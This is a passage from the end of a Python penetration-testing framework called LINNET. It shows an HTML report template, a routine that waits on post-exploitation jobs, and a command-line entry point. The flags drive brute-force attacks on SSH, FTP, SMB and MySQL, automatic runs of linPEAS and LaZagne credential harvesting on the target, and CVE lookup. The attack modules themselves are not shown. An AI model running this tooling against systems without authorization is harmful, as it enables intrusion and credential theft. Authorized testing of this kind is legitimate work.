    <div class="stat-card" style="--card-color:var(--red)"><div class="stat-num">{count_c}</div><div class="stat-label">Critical</div></div>
    <div class="stat-card" style="--card-color:var(--orange)"><div class="stat-num">{count_h}</div><div class="stat-label">High</div></div>
    <div class="stat-card" style="--card-color:var(--yellow)"><div class="stat-num">{count_m}</div><div class="stat-label">Medium</div></div>
    <div class="stat-card" style="--card-color:var(--green)"><div class="stat-num">{count_l}</div><div class="stat-label">Low</div></div>
    <div class="stat-card" style="--card-color:var(--accent)"><div class="stat-num">{mods_run}</div><div class="stat-label">Modules</div></div>
    <div class="stat-card" style="--card-color:var(--yellow)"><div class="stat-num">{cred_cnt}</div><div class="stat-label">Creds Found</div></div>
  </div>
  <div class="section" id="modules">
    <div class="section-header">
      <div class="section-icon">⚙</div>
      <div class="section-title">Modules Executed</div>
      <span class="section-badge pill-run">{len(_module_data)} TOTAL</span>
    </div>
    <div class="module-grid">{module_cards_html}</div>
  </div>
  {cred_section}
  {proof_section}
  {postex_section}
  {cve_section}
  <div class="section" id="commands">
    <div class="section-header">
      <div class="section-icon">$</div>
      <div class="section-title">Commands Executed</div>
    </div>
    <div class="terminal">
      <div class="terminal-bar">
        <div class="t-dot t-red"></div><div class="t-dot t-yellow"></div><div class="t-dot t-green"></div>
        <div class="terminal-label">linnet — bash session</div>
      </div>
      <div class="terminal-body">{cmd_lines}</div>
    </div>
  </div>
  <div class="report-footer">
    <div class="footer-brand">LINNET</div>
    <div class="footer-info">Linux Network VAPT Framework v2.1 &nbsp;|&nbsp; {gen_time} &nbsp;|&nbsp; Target: {_esc(target)}</div>
  </div>
</main>
</body>
</html>"""

    filename = f"linnet_report_{target.replace('.','_')}_{now.strftime('%Y%m%d_%H%M%S')}.html"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(html)

    print(f"\n{'='*60}")
    print(f"  [+] REPORT SAVED  : {filename}")
    print(f"  [+] Credentials   : {cred_cnt}")
    print(f"  [+] CVEs          : {len(_cve_results)}")
    print(f"  [+] Proof entries : {sum(len(v) for v in _proof_log.values())}")
    print(f"  [+] Post-Exploit  : {len(_post_findings)} session(s)")
    print(f"  [+] Open in browser to view")
    print(f"{'='*60}\n")
    return filename


# ================================================================== #
#  WAIT FOR POST-EXPLOIT THREADS                                       #
# ================================================================== #

def _wait_for_postexploit_threads():
    bg_threads = [t for t in threading.enumerate()
                  if t.name.startswith("poll-") and t.is_alive()]
    if not bg_threads:
        return
    names = ", ".join(t.name for t in bg_threads)
    print(f"\n{'='*60}")
    print(f"  [*] {len(bg_threads)} background job(s) still running on remote target")
    print(f"  [*] Jobs : {names}")
    print(f"  [*] Waiting for output... (Ctrl+C to skip)")
    print(f"{'='*60}\n")
    spinner = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    spin_i  = 0
    start   = time.time()
    try:
        while any(t.is_alive() for t in bg_threads):
            elapsed = int(time.time() - start)
            alive   = [t.name.replace("poll-","") for t in bg_threads if t.is_alive()]
            print(f"\r  {spinner[spin_i % len(spinner)]}  Waiting: {', '.join(alive)} — {elapsed}s elapsed   ",
                  end="", flush=True)
            spin_i += 1
            time.sleep(0.5)
        print(f"\r  ✓  All background jobs complete!{' '*30}")
    except KeyboardInterrupt:
        print(f"\n\n  [!] Ctrl+C — stopped waiting.")
        print(f"  [!] linPEAS is STILL RUNNING on the remote target.")
        print(f"  [!] Fetch manually: sftp user@target:/tmp/.lnnt_linpeas_*.out ./linpeas_manual.txt\n")


# ================================================================== #
#  MAIN                                                                #
# ================================================================== #

def main():
    global _start_time, _flag_linuxprivesc, _flag_lazagne

    parser = argparse.ArgumentParser(description=BANNER, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-t", "--target",       required=True, help="Target IP address")
    parser.add_argument("--nmap",               help="Run custom Nmap scan")
    parser.add_argument("--ssh",                action="store_true", help="SSH enumeration + brute-force")
    parser.add_argument("--ftp",                action="store_true", help="FTP enumeration + brute-force")
    parser.add_argument("--smb",                action="store_true", help="SMB enumeration + brute-force")
    parser.add_argument("--http",               action="store_true", help="HTTP enumeration")
    parser.add_argument("--dns",                action="store_true", help="DNS enumeration")
    parser.add_argument("--snmp",               action="store_true", help="SNMP enumeration")
    parser.add_argument("--smtp",               action="store_true", help="SMTP enumeration")
    parser.add_argument("--mysql",              action="store_true", help="MySQL brute-force")
    parser.add_argument("--linuxprivesc",       action="store_true",
                        help="Auto-run linPEAS on target via SSH when creds found\n"
                             "  (use with --ssh for fully automatic flow)")
    parser.add_argument("--lazagne",            action="store_true",
                        help="Auto-run LaZagne on target via SSH when creds found\n"
                             "  (use with --ssh for fully automatic flow)")
    parser.add_argument("--cve", metavar="KEYWORD",
                        help="CVE lookup\n  --cve auto         (nmap -sV detect)\n"
                             "  --cve 'OpenSSH 8.2' (manual keyword)\n"
                             "  --cve CVE-2021-44228 (direct ID)")
    parser.add_argument("--all",                action="store_true", help="Run all modules + auto report")
    parser.add_argument("--report",             action="store_true", help="Generate HTML report after scan")

    args = parser.parse_args()

    _flag_linuxprivesc = args.linuxprivesc or args.all
    _flag_lazagne      = args.lazagne      or args.all

    _start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print(BANNER)
    print(f"[+] Target     : {args.target}")
    print(f"[+] Start Time : {_start_time}")
    if not PARAMIKO_OK:
        print("[!] WARNING: paramiko missing — Auto-SSH post-exploitation disabled")
        print("[!]          Install with:  pip install paramiko\n")

    if args.nmap:
        run(f"nmap {args.nmap} {args.target}")
    if args.ssh or args.all:
        ssh_module(args.target)
    if args.ftp or args.all:
        ftp_module(args.target)
    if args.smb or args.all:
        smb_module(args.target)
    if args.http or args.all:
        http_module(args.target)
    if args.dns or args.all:
        dns_module(args.target)
    if args.snmp or args.all:
        snmp_module(args.target)
    if args.smtp or args.all:
        smtp_module(args.target)
    if args.mysql or args.all:
        mysql_module(args.target)

    if args.linuxprivesc and not (args.ssh or args.all):
        linux_privesc_standalone(args.target)

    if args.lazagne and not (args.ssh or args.all):
        lazagne_module()

    if args.cve:
        kw = None if args.cve.lower() == "auto" else args.cve
        cve_module(keyword=kw, target=args.target)

    _wait_for_postexploit_threads()

    print(f"\n[+] Finished at {datetime.now()}")

    if args.report or args.all:
        generate_report(args.target)


if __name__ == "__main__":
    main()
